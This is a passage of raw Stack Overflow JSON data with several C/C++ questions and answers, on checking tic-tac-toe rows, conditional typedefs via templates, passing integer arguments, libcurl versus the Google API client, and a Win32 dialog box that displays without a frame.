could be done as for-loop instead, with dropping flag by break;"}], "tags": [], "owner": {"reputation": 26, "user_id": 4669372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/803d53ad1bb51e261d124873e8464012?s=128&d=identicon&r=PG&f=1", "display_name": "jiri-vyc", "link": "https://stackoverflow.com/users/4669372/jiri-vyc"}, "is_accepted": false, "score": 0, "last_activity_date": 1429726646, "last_edit_date": 1429726646, "creation_date": 1429725706, "answer_id": 29805531, "question_id": 29805419, "link": "https://stackoverflow.com/questions/29805419/how-to-check-equality-of-each-row-column-in-matrix/29805531#29805531", "title": "How to check equality of each row/column in matrix?", "body": "<p>Something in a sense of</p>\n\n<pre><code>i = 1;\nwhile(i&lt;Board_size &amp;&amp; Board[0][i-1] == Board[0][i])\n{\n    i++;\n}\nif (i&lt;Board_size) not equal;\n</code></pre>\n\n<p>?</p>\n\n<p>Not very efficient either, but simple.</p>\n\n<p>edit, the whole board:</p>\n\n<pre><code>int i;\nfor (int j=0;j&lt;Board_size;j++)\n{\n    i = 1;\n    while(i&lt;Board_size &amp;&amp; Board[j][i-1] == Board[j][i])\n    {\n        i++;\n    }\n    if (i&lt;Board_size) line j not equal;\n\n    i = 1;\n    while(i&lt;Board_size &amp;&amp; Board[i-1][j] == Board[i][j])\n    {\n        i++;\n    }\n    if (i&lt;Board_size) column j not equal;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 5, "last_activity_date": 1429725821, "creation_date": 1429725821, "answer_id": 29805567, "question_id": 29805419, "link": "https://stackoverflow.com/questions/29805419/how-to-check-equality-of-each-row-column-in-matrix/29805567#29805567", "title": "How to check equality of each row/column in matrix?", "body": "<p>Write a helper function to check that three items on a specific line are equal to each other. A line can be defined by an <code>(row, col)</code> position on the edge of the board and a pair of \"deltas\" <code>(dr, dc)</code> defining the \"step\" we need to take to get to the next square on the specific line:</p>\n\n<pre><code>bool check(char b[3][3], int row, int col, int dr, int dc) {\n    return b[row][col] == b[row+dr][col+dc]\n        &amp;&amp; b[row][col] == b[row+2*dr][col+2*dc];\n}\n</code></pre>\n\n<p>To check if there is a win on the board you can check all eight winning lines:</p>\n\n<pre><code>bool hasWin = check(0, 0, 0, 1) // First horizontal line\n           || check(1, 0, 0, 1) // Second horizontal line\n           || check(2, 0, 0, 1) // Third horizontal line\n           || check(0, 0, 1, 0) // First vertical line\n           || check(0, 1, 1, 0) // Second vertical line\n           || check(0, 2, 1, 0) // Third vertical line\n           || check(0, 0, 1, 1) // First diagonal\n           || check(0, 2, 1, -1); // Second diagonal\n</code></pre>\n"}], "owner": {"reputation": 196, "user_id": 2098259, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/4Kn1z.png?s=128&g=1", "display_name": "MerajA", "link": "https://stackoverflow.com/users/2098259/meraja"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2289, "favorite_count": 0, "accepted_answer_id": 29805567, "answer_count": 2, "score": 1, "last_activity_date": 1429726646, "creation_date": 1429725325, "question_id": 29805419, "link": "https://stackoverflow.com/questions/29805419/how-to-check-equality-of-each-row-column-in-matrix", "title": "How to check equality of each row/column in matrix?", "body": "<p>I have a <code>char Board[3][3]</code> matrix. I am trying to check, whether the elements in each row/column are equal. ie. <code>Board[0][0] == Board[0][1] == Board[0][2]</code>, and so on for the other rows and columns.</p>\n\n<p>This is for checking for a win in a tic-tac-toe game, so obviously, writing all the possible combinations is very 'inefficient'.</p>\n\n<p>Is there any shorter way to do this?</p>\n"}, {"tags": ["c++", "templates"], "comments": [{"owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "edited": false, "score": 0, "creation_date": 1429725109, "post_id": 29805114, "comment_id": 47738437, "body": "I don&#39;t know what <code>enable_if</code> is doing there?"}, {"owner": {"reputation": 154, "user_id": 4246048, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d2ff80c6f69f70e9a71e9b25d8d9de78?s=128&d=identicon&r=PG&f=1", "display_name": "newbie", "link": "https://stackoverflow.com/users/4246048/newbie"}, "edited": false, "score": 0, "creation_date": 1429725812, "post_id": 29805114, "comment_id": 47738903, "body": "Can you give us an example to show how it is used in your C functions?"}], "answers": [{"tags": [], "owner": {"reputation": 325758, "user_id": 415784, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2WX9Z.jpg?s=128&g=1", "display_name": "Nawaz", "link": "https://stackoverflow.com/users/415784/nawaz"}, "is_accepted": true, "score": 3, "last_activity_date": 1429725686, "last_edit_date": 1429725686, "creation_date": 1429725382, "answer_id": 29805441, "question_id": 29805114, "link": "https://stackoverflow.com/questions/29805114/cleaner-alternative-for-conditional-typedef-using-templates/29805441#29805441", "title": "cleaner alternative for conditional typedef using templates", "body": "<p>Maybe an alias would help you:</p>\n\n<pre><code>using Int  = best&lt;int,best&lt;long int,long long&gt;&gt;;\n\nusing UInt = best&lt;unsigned int,best&lt;unsigned long int,unsigned long long int&gt;&gt;;\n</code></pre>\n\n<p>where <code>best</code> is a template alias, defined as:</p>\n\n<pre><code>template&lt;typename T, typename U&gt;\nusing best = typename std::conditional&lt;sizeof(T)==sizeof(void*),T,U&gt;::type;\n</code></pre>\n\n<p>Note that I'm not sure if that solves your problem, but if your complain is about lengthy templates, then maybe the above technique gives you some  idea as to how to make it a bit shorter &mdash; <em>and cleaner</em>.</p>\n\n<p>You could use <code>_t</code> version if you have C++14:</p>\n\n<pre><code>template&lt;typename T, typename U&gt;\nusing best = std::conditional_t&lt;sizeof(T)==sizeof(void*),T,U&gt;;\n</code></pre>\n\n<p>Hope that helps.</p>\n"}, {"comments": [{"owner": {"reputation": 91523, "user_id": 251738, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b01b33120fefaad052b4a6864cbc7517?s=128&d=identicon&r=PG", "display_name": "Mark B", "link": "https://stackoverflow.com/users/251738/mark-b"}, "edited": false, "score": 0, "creation_date": 1429725550, "post_id": 29805446, "comment_id": 47738737, "body": "This is good but I&#39;m going to go a step further and suggest to use the original <code>foo-ptr_t</code> types directly rather than hiding them behind a typedef."}, {"owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "reply_to_user": {"reputation": 91523, "user_id": 251738, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b01b33120fefaad052b4a6864cbc7517?s=128&d=identicon&r=PG", "display_name": "Mark B", "link": "https://stackoverflow.com/users/251738/mark-b"}, "edited": false, "score": 0, "creation_date": 1429725661, "post_id": 29805446, "comment_id": 47738817, "body": "@MarkB: I did consider that, but if he has a significant body of code that already uses his <code>Int</code>/<code>UInt</code> types, that might involve quite a bit of extra work for little real benefit."}], "tags": [], "owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "is_accepted": false, "score": 2, "last_activity_date": 1429725395, "creation_date": 1429725395, "answer_id": 29805446, "question_id": 29805114, "link": "https://stackoverflow.com/questions/29805114/cleaner-alternative-for-conditional-typedef-using-templates/29805446#29805446", "title": "cleaner alternative for conditional typedef using templates", "body": "<p>For this particular task, you seem to want (roughly):</p>\n\n<pre><code>typedef intptr_t Int;\ntypedef uintptr_t UInt;\n</code></pre>\n"}], "owner": {"reputation": 6043, "user_id": 3998522, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/042b8c418b7f1129fa54862a935377b8?s=128&d=identicon&r=PG&f=1", "display_name": "xiver77", "link": "https://stackoverflow.com/users/3998522/xiver77"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 97, "favorite_count": 0, "accepted_answer_id": 29805441, "answer_count": 2, "score": 2, "last_activity_date": 1429725686, "creation_date": 1429724390, "question_id": 29805114, "link": "https://stackoverflow.com/questions/29805114/cleaner-alternative-for-conditional-typedef-using-templates", "title": "cleaner alternative for conditional typedef using templates", "body": "<p>While playing around with some templates, to remove some macros in my code, I got to the following code,</p>\n\n<pre><code>typedef std::conditional&lt;sizeof(int) == sizeof(void*),\n    int,\n    std::conditional&lt;sizeof(long int) == sizeof(void*),\n        long int,\n        std::enable_if&lt;sizeof(long long int) == sizeof(void*), long long int&gt;::type\n    &gt;::type\n&gt;::type Int;\ntypedef std::conditional&lt;sizeof(unsigned int) == sizeof(Int),\n    unsigned int,\n    std::conditional&lt;sizeof(unsigned long int) == sizeof(Int),\n        unsigned long int,\n        std::enable_if&lt;sizeof(unsigned long long int) == sizeof(Int), unsigned long long int&gt;::type\n    &gt;::type\n&gt;::type UInt;\n</code></pre>\n\n<p>while trying to replace,</p>\n\n<pre><code>#if sizeof(int) == sizeof(void*)\n    typedef int Int;\n    typedef unsigned int UInt;\n#elif sizeof(long int) == sizeof(void*)\n    typedef long int Int;\n    typedef unsigned long int UInt;\n#elif sizeof(long long int) == sizeof(void*)\n    typedef long long int Int;\n    typedef unsigned long long int UInt;\n#else\n    #error\n#endif\n</code></pre>\n\n<p>Can you think of a cleaner and shorter alternative using templates? or is it just a bad idea to use templates to replace every possible macros.</p>\n\n<p>Btw, that code is used for passing integer values to some C functions that only accept <code>void*</code>, with minimal overhead.</p>\n"}, {"tags": ["c++", "function", "integer", "arguments"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 5, "creation_date": 1429724474, "post_id": 29805108, "comment_id": 47737985, "body": "Did you even try to search for information on <a href=\"http://www.cplusplus.com/doc/tutorial/functions/\" rel=\"nofollow noreferrer\">functions</a>?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4100037"}, "reply_to_user": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1429725448, "post_id": 29805108, "comment_id": 47738662, "body": "@NathanOliver yes, yes I did - hence why I&#39;m here."}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429725731, "post_id": 29805108, "comment_id": 47738858, "body": "@Geos59 <i>&quot;yes, yes I did - hence why I&#39;m here. &quot;</i> Apparently not enough research, and not in the obvious sources: <a href=\"http://en.cppreference.com/w/cpp/language/function\" rel=\"nofollow noreferrer\">Declaring functions</a>."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4100037"}, "edited": false, "score": 0, "creation_date": 1429725538, "post_id": 29805393, "comment_id": 47738729, "body": "Thank you, I still need more practice with arguments."}], "tags": [], "owner": {"reputation": 68, "user_id": 3458302, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001422838322/picture?type=large", "display_name": "vishwajit kumar vishnu", "link": "https://stackoverflow.com/users/3458302/vishwajit-kumar-vishnu"}, "is_accepted": true, "score": 2, "last_activity_date": 1429725232, "creation_date": 1429725232, "answer_id": 29805393, "question_id": 29805108, "link": "https://stackoverflow.com/questions/29805108/using-function-integer-arguments-with-my-c-program/29805393#29805393", "title": "Using function integer arguments with my C++ program", "body": "<p>Sample program:</p>\n\n<pre><code>#include &lt;iostream&gt;\nusing namespace std;\nvoid oddEven(int num/*num is integer argument*/){\n    if (num % 2)\n    {\n     cout&lt;&lt;\"It's odd\"&lt;&lt;endl;\n    }\n    else\n    {\n      cout&lt;&lt;\"It's even\"&lt;&lt;endl;\n    }\n}\nint main() //Main program\n{   int x;\n    cout&lt;&lt;\"Please enter a number \"&lt;&lt;endl;\n    cin&gt;&gt;x;\n    oddEven(x); //Calling my Function\n     return 0;\n }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429725483, "post_id": 29805431, "comment_id": 47738686, "body": "Are you actually plagiarizing the other answer, or is this just an incident?"}, {"owner": {"reputation": 5511, "user_id": 4516316, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GBirF.jpg?s=128&g=1", "display_name": "Arun A S", "link": "https://stackoverflow.com/users/4516316/arun-a-s"}, "reply_to_user": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429725543, "post_id": 29805431, "comment_id": 47738732, "body": "@\u03c0\u03ac\u03bd\u03c4\u03b1\u1fe5\u03b5\u1fd6 , this is clearly my own version of the code. I was editing the OP&#39;s code when the other answer was posed, so I didn&#39;t even see it."}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429725905, "post_id": 29805431, "comment_id": 47738969, "body": "Yeah, I know. Sometimes you&#39;re just late, but usually I&#39;m notified about other answers appearing on the question, even while I&#39;m editing. This could have significant delays (especially on mobile devices)."}], "tags": [], "owner": {"reputation": 5511, "user_id": 4516316, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GBirF.jpg?s=128&g=1", "display_name": "Arun A S", "link": "https://stackoverflow.com/users/4516316/arun-a-s"}, "is_accepted": false, "score": 0, "last_activity_date": 1429725356, "creation_date": 1429725356, "answer_id": 29805431, "question_id": 29805108, "link": "https://stackoverflow.com/questions/29805108/using-function-integer-arguments-with-my-c-program/29805431#29805431", "title": "Using function integer arguments with my C++ program", "body": "<p>Here's the code</p>\n\n<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid oddEven( int num ) //My Function  \n{ \n    if (num % 2)\n    {\n        cout &lt;&lt; \"It's odd\" &lt;&lt; endl;\n    }\n    else\n    {\n        cout &lt;&lt; \"It's even\" &lt;&lt; endl;\n    }    \n}\n\nint main() //Main program    \n{        \n    int num;\n    cout &lt;&lt; \"Please enter a number \" &lt;&lt; endl;\n    cin &gt;&gt; num;\n    oddEven(num); //Calling my Function\n    return 0;\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4100037"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 309, "favorite_count": 0, "accepted_answer_id": 29805393, "answer_count": 2, "score": -2, "last_activity_date": 1429725356, "creation_date": 1429724374, "last_edit_date": 1429725233, "question_id": 29805108, "link": "https://stackoverflow.com/questions/29805108/using-function-integer-arguments-with-my-c-program", "title": "Using function integer arguments with my C++ program", "body": "<p>I have a little project to do, I've created a program that when the user types a number, it will say if it's even or odd. I even used a function. Here's my question:</p>\n\n<p>How do I use integer arguments in a function for the program? (My program <em>does work</em>, it just doesn't use integer arguments.)</p>\n\n<p><strong>Instructions</strong></p>\n\n<p>Write a C++ function that accepts an integer argument, determines whether the passed integer is even or odd, and displays the result of this determination. (Hint: Use the % operator.)</p>\n\n<p>Make sure your function is called from main(). Test the function by passing various data to it. </p>\n\n<p><strong>My code</strong></p>\n\n<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid oddEven() //My Function  \n{ \n    int num;\n\n    cout &lt;&lt; \"Please enter a number \" &lt;&lt; endl;\n    cin &gt;&gt; num;\n\n    if (num % 2)\n    {\n        cout &lt;&lt; \"It's odd\" &lt;&lt; endl;\n    }\n    else\n    {\n        cout &lt;&lt; \"It's even\" &lt;&lt; endl;\n    }    \n}\n\nint main() //Main program    \n{    \n    oddEven(); //Calling my Function\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "http", "c++11", "google-api", "libcurl"], "answers": [{"comments": [{"owner": {"reputation": 43751, "user_id": 93747, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dbf187b5b45c400649ed7f946e8f00d6?s=128&d=identicon&r=PG", "display_name": "Daniel Stenberg", "link": "https://stackoverflow.com/users/93747/daniel-stenberg"}, "edited": false, "score": 0, "creation_date": 1429729073, "post_id": 29805668, "comment_id": 47740952, "body": "Does Casablanca even support multipart HTTP POST?"}, {"owner": {"reputation": 707, "user_id": 3906969, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/EOsOS.jpg?s=128&g=1", "display_name": "ap6491", "link": "https://stackoverflow.com/users/3906969/ap6491"}, "edited": false, "score": 0, "creation_date": 1429795173, "post_id": 29805668, "comment_id": 47775648, "body": "Thanks @AndrewKomiagin"}], "tags": [], "owner": {"reputation": 6090, "user_id": 4699340, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/U4Ums.jpg?s=128&g=1", "display_name": "Andrew Komiagin", "link": "https://stackoverflow.com/users/4699340/andrew-komiagin"}, "is_accepted": false, "score": 0, "last_activity_date": 1429726143, "creation_date": 1429726143, "answer_id": 29805668, "question_id": 29804998, "link": "https://stackoverflow.com/questions/29804998/google-api-client-library-for-c-vs-libcurl-for-sending-http-request/29805668#29805668", "title": "Google API Client Library for C++ vs libcurl for sending HTTP request?", "body": "<p>The <strong>Google API Client Library</strong> is just a C++ wrapper around <strong>libcurl</strong> which is pure C library. I would use <strong>Casablanca REST SDK</strong> which is written in modern C++11, has no external dependencies and is cross platform.</p>\n"}], "owner": {"reputation": 707, "user_id": 3906969, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/EOsOS.jpg?s=128&g=1", "display_name": "ap6491", "link": "https://stackoverflow.com/users/3906969/ap6491"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 304, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1429726143, "creation_date": 1429724064, "question_id": 29804998, "link": "https://stackoverflow.com/questions/29804998/google-api-client-library-for-c-vs-libcurl-for-sending-http-request", "title": "Google API Client Library for C++ vs libcurl for sending HTTP request?", "body": "<p>After installing google-api-client library for C++ on a Fedora 20 machine, I find out that it has external dependencies on libcurl (for example, setting up http proxy). I was planning to use google-api-client for sending HTTP request, mainly, HTTP multipart POST request. However, libcurl does provide support for multipart HTTP POST request also. </p>\n\n<p>Could someone let me know the advantages of using Google API Client library for C++ over libcurl in order to send HTTP request?</p>\n\n<p>Any suggestions/recommendations would be highly appreciated.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c++", "dialog", "window", "box"], "comments": [{"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 2, "creation_date": 1429725062, "post_id": 29804990, "comment_id": 47738410, "body": "It&#39;s not immediately clear what library you&#39;re using to generate the dialog box. You should probably clarify this."}, {"owner": {"reputation": 25, "user_id": 4820386, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8e5476ef15f982f9ba99052c87b232a7?s=128&d=identicon&r=PG&f=1", "display_name": "Diego Cea L&#243;pez", "link": "https://stackoverflow.com/users/4820386/diego-cea-l%c3%b3pez"}, "reply_to_user": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 0, "creation_date": 1429784474, "post_id": 29804990, "comment_id": 47767358, "body": "I used ResEdit to create the resource file because VS2013 Express doesn&#39;t include a resource editor. I&#39;m just using the standard Windows API to display de Dialog. I should mention that the application is a system tray app and it starts in the system tray with it&#39;s icon automatically, that&#39;s why the dialog does not have any parent window."}], "answers": [{"tags": [], "owner": {"reputation": 25, "user_id": 4820386, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8e5476ef15f982f9ba99052c87b232a7?s=128&d=identicon&r=PG&f=1", "display_name": "Diego Cea L&#243;pez", "link": "https://stackoverflow.com/users/4820386/diego-cea-l%c3%b3pez"}, "is_accepted": true, "score": 1, "last_activity_date": 1429789173, "creation_date": 1429789173, "answer_id": 29822339, "question_id": 29804990, "link": "https://stackoverflow.com/questions/29804990/why-does-my-dialog-box-appear-like-this/29822339#29822339", "title": "Why does my dialog box appear like this?", "body": "<p>I already fixed it. I was returning true in the dialog procedure instead of false. </p>\n\n<p>From MSDN:</p>\n\n<p>\"Typically, the dialog box procedure should return TRUE if it processed the message, and FALSE if it did not. If the dialog box procedure returns FALSE, the dialog manager performs the default dialog operation in response to the message.\"</p>\n"}], "owner": {"reputation": 25, "user_id": 4820386, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8e5476ef15f982f9ba99052c87b232a7?s=128&d=identicon&r=PG&f=1", "display_name": "Diego Cea L&#243;pez", "link": "https://stackoverflow.com/users/4820386/diego-cea-l%c3%b3pez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 140, "favorite_count": 0, "accepted_answer_id": 29822339, "answer_count": 1, "score": 0, "last_activity_date": 1429789173, "creation_date": 1429724035, "last_edit_date": 1429724132, "question_id": 29804990, "link": "https://stackoverflow.com/questions/29804990/why-does-my-dialog-box-appear-like-this", "title": "Why does my dialog box appear like this?", "body": "<p>I have created a simple dialog box in a resource file. When I try to spawn it using DialogBox(), the dialog appears but it looks like does not have a window. I don't know why this happens. Any advice?</p>\n\n<p>It looks like this when running, as you can see there is no window. The check boxes, text and stuff don't have a background, and there is no title bar. Nothing.</p>\n\n<p><img src=\"https://i.stack.imgur.com/LBXMZ.png\" alt=\"enter image description here\"></p>\n\n<p>And it should show up as this:</p>\n\n<p><img src=\"https://i.stack.imgur.com/187sS.png\" alt=\"enter image description here\"></p>\n\n<p>The code I use to spawn it is:</p>\n\n<pre><code>bool mostrarVentanaConfiguracion() {\n\n    DialogBox(GetModuleHandle(0), MAKEINTRESOURCE(ID_DIAG_CONFIG), NULL, (DLGPROC)VentanaConfiguracion);\n    return true;\n}\n</code></pre>\n\n<p>This is the .rc file code:</p>\n\n<pre><code>LANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL\nID_DIAG_CONFIG DIALOG 260, 200, 339, 203\nSTYLE DS_3DLOOK | DS_CENTER | DS_MODALFRAME | DS_SHELLFONT | WS_CAPTION | WS_POPUP | WS_SYSMENU | WS_BORDER | WS_VISIBLE\nCAPTION \"Configuraci\u00f3n\"\nFONT 8, \"Ms Shell Dlg\"\n{\n    LTEXT           \"Pulsar la combinaci\u00f3n de teclas.\", 0, 218, 18, 102, 9, SS_LEFT, WS_EX_LEFT\n    CONTROL         \"\", ID_CONF_MACRO, HOTKEY_CLASS, WS_TABSTOP, 136, 16, 77, 12, WS_EX_LEFT\n    EDITTEXT        ID_CONF_INDICATIVO, 16, 16, 70, 12, ES_AUTOHSCROLL, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_REUNION, 14, 67, 8, 8, 0, WS_EX_LEFT\n    LTEXT           \"... avisos de reuniones o 10-80 general.\", 0, 28, 67, 125, 9, SS_LEFT, WS_EX_LEFT\n    GROUPBOX        \"Configuraci\u00f3n de los avisos\", 0, 5, 36, 328, 142, 0, WS_EX_LEFT\n    PUSHBUTTON      \"Cancelar\", IDCANCEL, 220, 184, 49, 14, 0, WS_EX_LEFT\n    DEFPUSHBUTTON   \"Guardar\\r\\n\", IDOK, 280, 184, 54, 14, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_SEISADAM, 14, 80, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_CODIGOCINCO, 14, 92, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_CENTRALITA, 14, 105, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_REP_UNIDADES, 14, 117, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_PROPIO, 14, 129, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_PEDIDOS, 14, 141, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_PEDIDOS_SWAT, 14, 153, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_SIN_ASIG, 14, 165, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_PANICO, 187, 67, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_APOYO, 187, 79, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_HERIDO, 187, 91, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_ROBO_COCHE, 187, 103, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_ROBO_CASA, 187, 115, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_ROBO_NEG, 187, 127, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_PAPAFOX, 187, 139, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_ROBO_BANCO, 187, 151, 8, 8, 0, WS_EX_LEFT\n    AUTOCHECKBOX    \"Check\", ID_A_CUSTODIA, 187, 163, 8, 8, 0, WS_EX_LEFT\n    LTEXT           \"Recibir notificaciones sonoras para...\", 0, 14, 50, 117, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de C\u00d3DIGO 6-ADAM.\", 0, 28, 79, 100, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de C\u00d3DIGO 5.\", 0, 28, 91, 77, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de centralita roleados.\", 0, 28, 103, 100, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... pedidos de reportes de unidades.\", 0, 28, 115, 114, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos a mi propia unidad o nombre.\", 0, 28, 127, 122, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de pedidos generales (10-32, 10-37...)\", 0, 28, 139, 150, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de pedidos para SWAT\", 0, 28, 151, 105, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de agentes sin asignaci\u00f3n.\", 0, 28, 163, 115, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de bot\u00f3n de p\u00e1nico.\", 0, 201, 67, 94, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de solicitud de apoyo (/ref)\", 0, 201, 79, 115, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de herido.\", 0, 201, 91, 62, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de robo de veh\u00edculo.\", 0, 201, 103, 97, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de robo a vivienda. \", 0, 201, 115, 94, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de robo a negocio.\", 0, 201, 127, 90, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de alarma de prisi\u00f3n federal.\", 0, 201, 139, 119, 9, SS_LEFT, WS_EX_LEFT\n    LTEXT           \"... avisos de robo a banco.\", 0, 201, 151, 85, 9, SS_LEFT, 